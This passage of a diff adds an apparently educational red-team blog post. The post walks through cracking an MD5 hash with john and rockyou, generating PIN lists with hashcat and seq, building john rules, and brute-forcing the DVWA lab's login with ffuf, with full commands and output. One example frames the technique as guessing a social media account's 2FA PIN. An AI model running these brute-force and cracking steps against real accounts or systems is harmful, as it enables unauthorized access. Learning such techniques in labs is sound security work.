+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(sha1(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(sha1(md5(sha1($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">))))
+</span><span style="color:#eb6772;">[+]</span><span style="color:#abb2bf;"> md5(strtoupper(md5($</span><span style="color:#eb6772;">pass</span><span style="color:#abb2bf;">)))
+</span><span style="color:#eb6772;">--------------------------------------------------
+</span></code></pre>
+<h3 id="hash-cracking">Hash Cracking</h3>
+<p>Now that we have an MD5 hash to crack, I'll use the well-known wordlist <strong>rockyou</strong>, which comes pre-installed on <strong>Parrot OS</strong> and <strong>Kali Linux</strong> with <a href="https://github.com/openwall/john">john</a> to crack this hash which laso comes pre-installed on <strong>Parrot OS</strong> and <strong>Kali Linux</strong>.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> john</span><span style="color:#eb6772;"> --wordlist</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">/usr/share/wordlists/rockyou.txt hash.txt</span><span style="color:#eb6772;"> --format</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">Raw-MD5
+</span><span style="color:#eb6772;">Using</span><span style="color:#abb2bf;"> default input encoding: UTF-8
+</span><span style="color:#eb6772;">Loaded</span><span style="color:#abb2bf;"> 1 password hash (Raw-MD5 </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">MD5 128/128 AVX 4x3</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;">)
+</span><span style="color:#eb6772;">Warning:</span><span style="color:#abb2bf;"> no OpenMP support for this hash type, consider</span><span style="color:#eb6772;"> --fork</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">4
+</span><span style="color:#eb6772;">Press </span><span style="color:#9acc76;">&#39;q&#39;</span><span style="color:#abb2bf;"> or Ctrl-C to abort, almost any other key for status
+</span><span style="color:#eb6772;">machiavelli</span><span style="color:#abb2bf;">      (</span><span style="color:#adb7c9;">?</span><span style="color:#abb2bf;">)     
+</span><span style="color:#eb6772;">1g</span><span style="color:#abb2bf;"> 0:00:00:00 DONE (2025-01-26 21:46) </span><span style="color:#eb6772;">3.030g/s</span><span style="color:#abb2bf;"> 554472p/s 554472c/s 554472C/s mandy33..lupakan
+</span><span style="color:#eb6772;">Use</span><span style="color:#abb2bf;"> the </span><span style="color:#9acc76;">&quot;--show --format=Raw-MD5&quot;</span><span style="color:#abb2bf;"> options to display all of the cracked passwords reliably
+</span><span style="color:#eb6772;">Session</span><span style="color:#abb2bf;"> completed.
+</span></code></pre>
+<p><strong>Yaaay</strong> we cracked our first hash.</p>
+<h1 id="brute-force-attacks">Brute-Force Attacks</h1>
+<p>A <strong>Brute-Force attack</strong> aims to try all possible combinations of characters, including symbols and numbers, to guess a password or PIN.</p>
+<p>For example, let's assume we want to gain unauthorized access to a social media account. We know that the account 2FA uses a 4-digit PIN. With this knowledge, we can perform a brute-force attack that systematically tries every combination from <code>0000</code> to <code>9999</code> to guess the correct PIN.</p>
+<p><code>Hashcat</code> includes a <strong>charset</strong> option that allows us to generate custom character combinations for cracking purposes.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> hashcat</span><span style="color:#eb6772;"> --help
+</span><span style="color:#eb6772;">---
+</span><span style="color:#eb6772;">? </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">Charset
+</span><span style="color:#adb7c9;">=</span><span style="color:#9acc76;">==+=========
+</span><span style="color:#eb6772;">l </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">abcdefghijklmnopqrstuvwxyz </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">a</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">z</span><span style="color:#cd74e8;">]
+</span><span style="color:#eb6772;">u </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">ABCDEFGHIJKLMNOPQRSTUVWXYZ </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">A</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">Z</span><span style="color:#cd74e8;">]
+</span><span style="color:#eb6772;">d </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">0123456789                 </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">0</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">9</span><span style="color:#cd74e8;">]
+</span><span style="color:#eb6772;">h </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">0123456789abcdef           </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">0</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">9a</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">f</span><span style="color:#cd74e8;">]
+</span><span style="color:#eb6772;">H </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">0123456789ABCDEF           </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">0</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">9A</span><span style="color:#adb7c9;">-</span><span style="color:#abb2bf;">F</span><span style="color:#cd74e8;">]
+</span><span style="color:#eb6772;">s </span><span style="color:#adb7c9;">|  </span><span style="color:#eb6772;">!</span><span style="color:#9acc76;">&quot;#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[\]^_`</span><span style="color:#eb6772;">{</span><span style="color:#adb7c9;">|</span><span style="color:#9acc76;">}</span><span style="color:#eb6772;">~
+</span><span style="color:#eb6772;">a </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">?l?u?d?s
+</span><span style="color:#eb6772;">b </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">0x00</span><span style="color:#9acc76;"> - 0xff
+</span><span style="color:#eb6772;">---
+</span></code></pre>
+<p>We can use these charsets based on our specific needs. In our example, since we're targeting a social media account with a 4-digit PIN, we can use the charset to generate all possible PIN combinations.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> hashcat</span><span style="color:#eb6772;"> -a</span><span style="color:#abb2bf;"> 3 </span><span style="color:#adb7c9;">?</span><span style="color:#abb2bf;">d</span><span style="color:#adb7c9;">?</span><span style="color:#abb2bf;">d</span><span style="color:#adb7c9;">?</span><span style="color:#abb2bf;">d</span><span style="color:#adb7c9;">?</span><span style="color:#abb2bf;">d</span><span style="color:#eb6772;"> --stdout
+</span><span style="color:#eb6772;">1234
+</span><span style="color:#eb6772;">0234
+</span><span style="color:#eb6772;">2234
+</span><span style="color:#eb6772;">3234
+</span><span style="color:#eb6772;">9234
+</span><span style="color:#eb6772;">4234
+</span><span style="color:#eb6772;">5234
+</span><span style="color:#eb6772;">8234
+</span><span style="color:#eb6772;">7234
+</span><span style="color:#eb6772;">6234
+</span><span style="color:#eb6772;">1101
+</span><span style="color:#eb6772;">0101
+</span><span style="color:#eb6772;">2101
+</span><span style="color:#eb6772;">3101
+</span><span style="color:#eb6772;">9101
+</span><span style="color:#eb6772;">...
+</span></code></pre>
+<h4 id="command-breakdown">Command Breakdown</h4>
+<ul>
+<li><code>-a 3</code> Specifies the attack mode as a brute-force or mask attack.</li>
+<li><code>?d?d?d?d</code> The mask used to define the format of the combinations. Each <code>?d</code> represents a single digit (0-9), so <code>?d?d?d?d</code> generates all possible 4-digit PINs.</li>
+<li><code>--stdout</code> Outputs the generated combinations directly to the terminal instead of cracking a hash.</li>
+</ul>
+<p>Another way to generate 4-digit or 6-digit PINs is by using the <code>seq</code> command. This command can sequentially generate numbers with leading zeros, making it ideal for creating PIN combinations.</p>
+<p>For example, to generate all 4-digit PINs (from <code>0000</code> to <code>9999</code>), you can use the following command:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> seq</span><span style="color:#eb6772;"> -w</span><span style="color:#abb2bf;"> 0 9999
+</span><span style="color:#eb6772;">0000
+</span><span style="color:#eb6772;">0001
+</span><span style="color:#eb6772;">0002
+</span><span style="color:#eb6772;">0003
+</span><span style="color:#eb6772;">0004
+</span><span style="color:#eb6772;">0005
+</span><span style="color:#eb6772;">0006
+</span><span style="color:#eb6772;">0007
+</span><span style="color:#eb6772;">0008
+</span><span style="color:#eb6772;">0009
+</span><span style="color:#eb6772;">0010
+</span><span style="color:#eb6772;">...
+</span><span style="color:#abb2bf;">
+</span><span style="font-style:italic;color:#5f697a;">## Rule-Based Attacks
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">The</span><span style="color:#abb2bf;"> (rule-based)</span><span style="color:#eb6772;">[https</span><span style="color:#adb7c9;">://</span><span style="color:#eb6772;">hashcat.net</span><span style="color:#adb7c9;">/</span><span style="color:#eb6772;">wiki</span><span style="color:#adb7c9;">/</span><span style="color:#eb6772;">doku.php</span><span style="color:#adb7c9;">?</span><span style="color:#eb6772;">id</span><span style="color:#adb7c9;">=</span><span style="color:#eb6772;">rule_based_attack] attacks</span><span style="color:#abb2bf;"> or hybrid attacks is like a programming language designed for password candidate generation. It has functions to modify, cut or extend words and has conditional operators to skip some, etc. That makes it the most flexible, accurate and efficient attack.
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">Through</span><span style="color:#abb2bf;"> this attack we can expand our wordlist using </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">john</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;">(http://www.openwall.com/john) </span><span style="color:#eb6772;">or </span><span style="color:#cd74e8;">[</span><span style="color:#abb2bf;">hashcat</span><span style="color:#cd74e8;">]</span><span style="color:#abb2bf;">(https://hashcat.net/wiki/doku.php</span><span style="color:#adb7c9;">?</span><span style="color:#abb2bf;">id=hashcat)</span><span style="color:#5ebfcc;">.
+</span><span style="color:#abb2bf;">
+</span><span style="font-style:italic;color:#5f697a;">### Rule-Based (John)
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">John</span><span style="color:#abb2bf;"> has a configuration file contains rule sets you can find it at `</span><span style="color:#eb6772;">/etc/john/john.conf</span><span style="color:#abb2bf;">` or `</span><span style="color:#eb6772;">/opt/john/john.conf</span><span style="color:#abb2bf;">`.
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">We</span><span style="color:#abb2bf;"> can look for the available rules:
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">```</span><span style="color:#eb6772;">bash
+</span><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> grep </span><span style="color:#9acc76;">&quot;List.Rules:&quot;</span><span style="color:#abb2bf;"> /etc/john/john.conf </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">cut -d </span><span style="color:#9acc76;">&quot;.&quot;</span><span style="color:#eb6772;"> -f3 </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">cut -d </span><span style="color:#9acc76;">&quot;:&quot;</span><span style="color:#eb6772;"> -f2 </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">tr -d </span><span style="color:#9acc76;">&quot;]&quot; </span><span style="color:#adb7c9;">| </span><span style="color:#eb6772;">tr -s </span><span style="color:#9acc76;">&quot;\n&quot;
+</span><span style="color:#eb6772;">JumboSingle
+</span><span style="color:#eb6772;">o1
+</span><span style="color:#eb6772;">o2
+</span><span style="color:#eb6772;">i1
+</span><span style="color:#eb6772;">i2
+</span><span style="color:#eb6772;">o1
+</span><span style="color:#eb6772;">i1
+</span><span style="color:#eb6772;">o2
+</span><span style="color:#eb6772;">i2
+</span><span style="color:#eb6772;">best64
+</span><span style="color:#eb6772;">d3ad0ne
+</span><span style="color:#eb6772;">dive
+</span><span style="color:#eb6772;">InsidePro
+</span><span style="color:#eb6772;">T0XlC
+</span><span style="color:#eb6772;">rockyou-30000
+</span><span style="color:#eb6772;">specific
+</span><span style="color:#eb6772;">ShiftToggle
+</span><span style="color:#eb6772;">Split
+</span><span style="color:#eb6772;">Single
+</span><span style="color:#eb6772;">Extra
+</span><span style="color:#eb6772;">OldOffice
+</span><span style="color:#eb6772;">Single-Extra
+</span><span style="color:#eb6772;">Wordlist
+</span><span style="color:#eb6772;">ShiftToggle
+</span><span style="color:#eb6772;">Multiword
+</span><span style="color:#eb6772;">best64
+</span><span style="color:#eb6772;">UnicodeSubstitution
+</span><span style="color:#eb6772;">Jumbo
+</span><span style="color:#eb6772;">KoreLogic
+</span><span style="color:#eb6772;">T9
+</span><span style="color:#eb6772;">hashcat
+</span></code></pre>
+<p>I'll use the <code>t0xlc</code> rule which prepends the last character to the beginning of the word.</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> john</span><span style="color:#eb6772;"> --wordlist</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">/usr/share/wordlists/seclists/Passwords/openwall.net-all.txt</span><span style="color:#eb6772;"> --rules</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">t0xlc</span><span style="color:#eb6772;"> --stdout
+</span><span style="color:#eb6772;">51234
+</span><span style="color:#eb6772;">3abc12
+</span><span style="color:#eb6772;">dpasswor
+</span><span style="color:#eb6772;">dpassw
+</span><span style="color:#eb6772;">612345
+</span><span style="color:#eb6772;">snewpas
+</span><span style="color:#eb6772;">dnotuse
+</span><span style="color:#eb6772;">yHocke
+</span><span style="color:#eb6772;">tinterne
+</span></code></pre>
+<h3 id="custom-rules">Custom Rules</h3>
+<p>Why don't we create our own rule? Let's create a rule that capitalizes the first letter and appends a random symbol at the end.</p>
+<pre style="background-color:#2b303b;color:#6c7079;"><code><span style="color:#abb2bf;">[List.Rules:CapitalizeAndAppendSymbol]
+</span><span style="color:#abb2bf;">:
+</span><span style="color:#abb2bf;">c ^A
+</span><span style="color:#abb2bf;">:
+</span><span style="color:#abb2bf;">c $[!@#$%^&amp;*]
+</span></code></pre>
+<p>Add the above code to the /etc/john/john.conf or /opt/john/john.conf based on your distro.</p>
+<h4 id="code-explanation">Code Explanation</h4>
+<ul>
+<li><code>:</code> is the base rule, which means "do nothing" (use the word as-is).</li>
+<li><code>c ^A</code> capitalizes the first character of the word.</li>
+<li><code>c $[!@#$%^&amp;*]</code> appends a random symbol from the list <code>!@#$%^&amp;*</code> to the end of the word.</li>
+</ul>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> john</span><span style="color:#eb6772;"> --wordlist</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">/usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt</span><span style="color:#eb6772;"> --rules</span><span style="color:#adb7c9;">=</span><span style="color:#abb2bf;">CapitalizeAndAppendSymbol</span><span style="color:#eb6772;"> --stdout
+</span><span style="color:#eb6772;">Root@
+</span><span style="color:#eb6772;">Admin@
+</span><span style="color:#eb6772;">Test@
+</span><span style="color:#eb6772;">Guest@
+</span><span style="color:#eb6772;">Info@
+</span><span style="color:#eb6772;">Adm@
+</span><span style="color:#eb6772;">Mysql@
+</span><span style="color:#eb6772;">User@
+</span><span style="color:#eb6772;">Administrator@
+</span><span style="color:#eb6772;">Oracle@
+</span><span style="color:#eb6772;">Ftp@
+</span><span style="color:#eb6772;">Pi@
+</span><span style="color:#eb6772;">Puppet@
+</span><span style="color:#eb6772;">Ansible@
+</span><span style="color:#eb6772;">Ec2-user@
+</span><span style="color:#eb6772;">Vagrant@
+</span><span style="color:#eb6772;">Azureuser@
+</span></code></pre>
+<p>It will print the words with multiple symbols and forms.</p>
+<h2 id="login-pages-brute-force">Login pages brute-force</h2>
+<h3 id="ffuf">FFuf</h3>
+<p><a href="https://github.com/ffuf/ffuf">FFuf</a>  is a web fuzzer written in Go that can be used for content discovery, parameter discovery, and Vhost discovery. We'll use it to brute-force login pages.</p>
+<p>First we'll try brute-forcing using <code>GET</code> method then <code>POST</code>.</p>
+<p>The vulnerable lab is <a href="https://github.com/digininja/DVWA">DVWA</a></p>
+<h4 id="get">GET</h4>
+<p>Here we're trying to brute-force the admin password:</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> ffuf</span><span style="color:#eb6772;"> -u </span><span style="color:#9acc76;">&quot;http://localhost:4280/vulnerabilities/brute/?username=admin&amp;password=FUZZ&amp;Login=Login&quot;</span><span style="color:#eb6772;"> -c -w</span><span style="color:#abb2bf;"> /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt</span><span style="color:#eb6772;"> -fs</span><span style="color:#abb2bf;"> 4436</span><span style="color:#eb6772;"> -H </span><span style="color:#9acc76;">&quot;Cookie: css_dark_mode=false; remember_token=defaultuser@changedetection.io|944643701d7eaf4435d6dabf09180720963153a8510359fc4aeee7eeaec680dc962b5017f211f9a49bcba9441023e354878583f2030cb7c112c3e68ed9008e85; security=low; PHPSESSID=7ab43eb74615da20f059669ff5e953d2&quot;</span><span style="color:#eb6772;"> -rate</span><span style="color:#abb2bf;"> 50
+</span><span style="color:#abb2bf;">
+</span><span style="color:#abb2bf;">        </span><span style="color:#eb6772;">/</span><span style="color:#9acc76;">&#39;___\  /&#39;</span><span style="color:#eb6772;">___</span><span style="color:#5ebfcc;">\ </span><span style="color:#abb2bf;">          /</span><span style="color:#9acc76;">&#39;___\       
+</span><span style="color:#9acc76;">       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span><span style="color:#9acc76;">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span><span style="color:#9acc76;">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span><span style="color:#9acc76;">         \ \_\   \ \_\  \ \____/  \ \_\       
+</span><span style="color:#9acc76;">          \/_/    \/_/   \/___/    \/_/       
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">       v2.1.0-dev
+</span><span style="color:#9acc76;">________________________________________________
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;"> :: Method           : GET
+</span><span style="color:#9acc76;"> :: URL              : http://localhost:4280/vulnerabilities/brute/?username=admin&amp;password=FUZZ&amp;Login=Login
+</span><span style="color:#9acc76;"> :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
+</span><span style="color:#9acc76;"> :: Header           : Cookie: css_dark_mode=false; remember_token=defaultuser@changedetection.io|944643701d7eaf4435d6dabf09180720963153a8510359fc4aeee7eeaec680dc962b5017f211f9a49bcba9441023e354878583f2030cb7c112c3e68ed9008e85; security=low; PHPSESSID=7ab43eb74615da20f059669ff5e953d2
+</span><span style="color:#9acc76;"> :: Follow redirects : false
+</span><span style="color:#9acc76;"> :: Calibration      : false
+</span><span style="color:#9acc76;"> :: Timeout          : 10
+</span><span style="color:#9acc76;"> :: Threads          : 40
+</span><span style="color:#9acc76;"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+</span><span style="color:#9acc76;"> :: Filter           : Response size: 4436
+</span><span style="color:#9acc76;">________________________________________________
+</span><span style="color:#9acc76;">
+</span><span style="color:#9acc76;">password                [Status: 200, Size: 4474, Words: 183, Lines: 112, Duration: 3ms]
+</span><span style="color:#9acc76;">:: Progress: [499/499] :: Job [1/1] :: 50 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
+</span></code></pre>
+<h5 id="code-explanation-1">Code Explanation</h5>
+<ul>
+<li><code>-u</code> specifies the target URL
+<ul>
+<li>The <code>FUZZ</code> keyword acts as a placeholder that will be replaced with words from the wordlist (for password brute-forcing).</li>
+<li>The request attempts to log in with <code>username=admin</code> and different <code>password</code> values.</li>
+</ul>
+</li>
+<li><code>-c</code> Enables colored output for better readability.</li>
+<li><code>-w</code> specifies the wordlist file to use for fuzzing.</li>
+<li><code>-fs</code> (filter size) filters out responses that have a response body size of 4436 bytes (failed login attempts).</li>
+<li><code>-H</code> adds custom HTTP headers.</li>
+<li>This includes a <code>Cookie</code> header, which is required for authentication (PHPSESSID).</li>
+<li><code>-rate</code> Limits the request rate to 50 requests per second to control fuzzing speed.</li>
+</ul>
+<p>We can see that <code>password</code> is a valid password!</p>
+<h4 id="post">POST</h4>
+<p>DVWA doesn't provide brute-force functionality via POST, so I will explain how you can do it!</p>
+<pre data-lang="bash" style="background-color:#2b303b;color:#6c7079;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#abb2bf;">
+</span><span style="color:#eb6772;">root@machiavelli:~#</span><span style="color:#abb2bf;"> ffuf</span><span style="color:#eb6772;"> -X</span><span style="color:#abb2bf;"> POST</span><span style="color:#eb6772;"> -d </span><span style="color:#9acc76;">&quot;username=admin\&amp;password=FUZZ&quot;</span><span style="color:#eb6772;"> -fc</span><span style="color:#abb2bf;"> 401</span><span style="color:#eb6772;"> -u </span><span style="color:#9acc76;">&quot;http://localhost:4280/login.php&quot;</span><span style="color:#eb6772;"> -w</span><span style="color:#abb2bf;"> /usr/share/wordlists/seclists/Passwords/Common-Credentials/500-worst-passwords.txt
+</span></code></pre>
+<h5 id="code-explanation-2">Code Explanation</h5>
+<ul>
+<li><code>-X</code> Specifies the HTTP method as <code>POST</code> (since login forms typically use POST requests).</li>
+<li><code>-d</code> (data) sends a POST request with form data.</li>
+<li><code>username=admin</code> The login attempt uses "admin" as the username.</li>
+<li><code>password=FUZZ</code> The <code>FUZZ</code> keyword will be replaced with values from the wordlist, allowing password brute-forcing.</li>
+<li>The <code>\&amp;</code> is used to escape the ampersand <code>(&amp;)</code> so it is correctly interpreted by the shell.</li>
+<li><code>-fc</code> (filter code) filters out HTTP responses with status code <code>401</code> (Unauthorized) This helps ignore failed login attempts and focus on potential successes..</li>
+<li><code>-u</code> specifies the target URL <code>(http://localhost:4280/login.php)</code>, where the login form is located.</li>
+<li><code>-w</code> (wordlist) defines the list of passwords to test against the login form we already know those flags.</li>
+</ul>
+<h2 id="conclusion">Conclusion</h2>
+<p>I hope you learned something!</p>
+<p>ولنلتقي في درسٍ آخر</p>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by Machiavelli
+                
+                
+                    
+                    in <a href="https://machiavelli.me/categories/red-team/">Red Team</a>
+                
+                
+                    and
+                    tagged
+                    
+                        <a href="https://machiavelli.me/tags/red-team/">Red Team</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/infosec/">Infosec</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/brute-force/">Brute Force</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/cewl/">Cewl</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/cupp/">CUPP</a>
+                        
+                            
+                                
+                                    ,
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/john/">John</a>
+                        
+                            
+                                
+                                    and
+                                
+                            
+                        
+                    
+                        <a href="https://machiavelli.me/tags/hashcat/">Hashcat</a>
+                        
+                            
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+
+  <!-- optional scripts -->
+  
+  
+  <script src="https://machiavelli.me/js/codeblock.js"></script>
+  
+
+  
+<!-- MathJax script for rendering LaTeX math equations -->
+<script>
+  MathJax = {
+    tex: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"],
+      ],
+      displayMath: [
+        ["$$", "$$"],
+        ["\\[", "\\]"],
+      ],
+    },
+  };
+</script>
+<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js" async></script>
+
+
+  
+<script type="text/javascript" src="https://machiavelli.me/elasticlunr.min.js"></script>
+<script type="text/javascript" src="https://machiavelli.me/js/search.js"></script>
+
+
+  
+</body>
+
+</html>
